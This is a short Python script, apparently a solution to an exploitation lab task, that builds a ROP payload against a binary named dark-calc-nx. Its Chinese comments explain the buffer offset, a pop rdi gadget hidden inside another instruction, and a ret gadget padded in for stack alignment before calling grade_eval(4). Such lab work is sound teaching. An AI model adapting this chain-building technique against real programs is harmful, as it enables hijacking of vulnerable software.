#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (ROP).

dark-calc-nx 的栈不可执行（NX）且地址随机（ASLR），但它不是 PIE，
代码段地址固定，因此使用 ROP (Return-Oriented Programming)：

  - input() 缓冲区仍在 rbp-0x10，返回地址仍在偏移 24 处。
  - 在 __libc_csu_init 的 `popq %r15; retq`（0x401a32: 41 5f c3）内部
    藏着一个 `popq %rdi; retq`（0x401a33: 5f c3）gadget。
  - 0x401a34 处就是一个单独的 retq，可用于调整栈对齐。
  - 链：pop rdi; ret -> 4 -> ret（对齐）-> grade_eval(0x401978)。

栈对齐说明：System V ABI 要求 call 指令执行时 rsp 16 字节对齐。
input() 返回后 rsp % 16 == 0，若没有中间的 ret gadget，进入
grade_eval 时 rsp % 16 == 0，printf 内部的 movaps 会因栈未对齐而
崩溃；多垫一个 ret 使进入 grade_eval 时 rsp % 16 == 8，满足约定。
"""
import sys


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


POP_RDI_RET = 0x401A33   # 5f c3:  popq %rdi; retq（藏在 pop r15; ret 中）
RET = 0x401A34           # c3:     retq（用于栈对齐）
GRADE_EVAL = 0x401978    # dark-calc-nx 中 grade_eval 的地址

payload = b"A" * 24              # 16 字节缓冲区 + 8 字节保存的 rbp
payload += p64(POP_RDI_RET)      # 返回地址 -> pop rdi; ret
payload += p64(4)                # rdi = 4（grade_eval 的参数）
payload += p64(RET)              # 调整栈对齐，防止 printf 内 movaps 崩溃
payload += p64(GRADE_EVAL)       # 调用 grade_eval(4)

sys.stdout.buffer.write(payload)
